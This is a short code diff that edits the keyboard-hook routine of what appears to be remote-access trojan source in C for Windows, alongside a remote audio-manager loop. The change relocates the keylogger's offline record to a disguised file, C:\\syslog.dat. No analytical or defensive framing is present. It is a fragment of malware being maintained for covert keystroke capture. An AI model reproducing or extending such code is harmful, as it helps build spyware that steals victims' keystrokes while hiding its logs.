@@ -80,9 +80,9 @@ DWORD WINAPI Loop_AudioManager(SOCKET sRemote)
 
 DWORD WINAPI Loop_HookKeyboard(LPARAM lparam)
 {
-	char	strKeyboardOfflineRecord[MAX_PATH];
-	GetSystemDirectory(strKeyboardOfflineRecord, sizeof(strKeyboardOfflineRecord));
-	lstrcat(strKeyboardOfflineRecord, "\\syslog.dat");
+	char	strKeyboardOfflineRecord[MAX_PATH] = {0};
+	//GetSystemDirectory(strKeyboardOfflineRecord, sizeof(strKeyboardOfflineRecord));
+	lstrcat(strKeyboardOfflineRecord, "C:\\syslog.dat");
 	
 	if (GetFileAttributes(strKeyboardOfflineRecord) != -1)
 		g_bSignalHook = true;
